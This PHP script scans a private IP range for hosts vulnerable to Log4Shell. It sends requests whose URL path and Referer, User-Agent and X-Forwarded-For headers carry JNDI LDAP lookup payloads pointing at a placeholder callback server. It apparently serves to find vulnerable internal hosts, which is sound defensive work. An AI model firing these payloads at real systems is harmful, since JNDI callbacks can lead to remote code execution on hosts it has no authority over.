<?php

/* Combine with python listener script in this directory to receive LDAP connection requests
 * Investigate any connections that are made to your listening server
 */

$start = '192.168.1.1'; // start IP
$end = '192.168.254.254'; // end IP

if ((ip2long($start) !== false) && (ip2long($end) !== false)) {
    for ($ip = ip2long($start); $ip <= ip2long($end); $ip++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 150);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);

        $headers = [
            'Referer: ${jndi:ldap://your-listening-server.net:11389/}',
            'User-Agent: ${jndi:ldap://your-listening-server.net:11389/}',
            'X-Forwarded-For: ${jndi:ldap://your-listening-server.net:11389/}'
        ];

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $url = sprintf("http://%s/q=\${jndi:ldap://your-listening-server.net:11389/}", long2ip($ip));
        echo "Testing " . $url . PHP_EOL;
        curl_setopt($ch, CURLOPT_URL, $url);
        $ex = curl_exec($ch);
        echo sprintf("Got response %d (errno %d): %s\n", curl_getinfo($ch, CURLINFO_RESPONSE_CODE), curl_errno($ch), $ex);

        $url = sprintf("https://%s/q=\${jndi:ldap://your-listening-server.net:11389/}", long2ip($ip));
        echo "Testing " . $url . PHP_EOL;
        curl_setopt($ch, CURLOPT_URL, $url);
        $ex = curl_exec($ch);

        echo sprintf("Got response %d (errno %d): %s\n", curl_getinfo($ch, CURLINFO_RESPONSE_CODE), curl_errno($ch), $ex);
        curl_close($ch);
    }
}
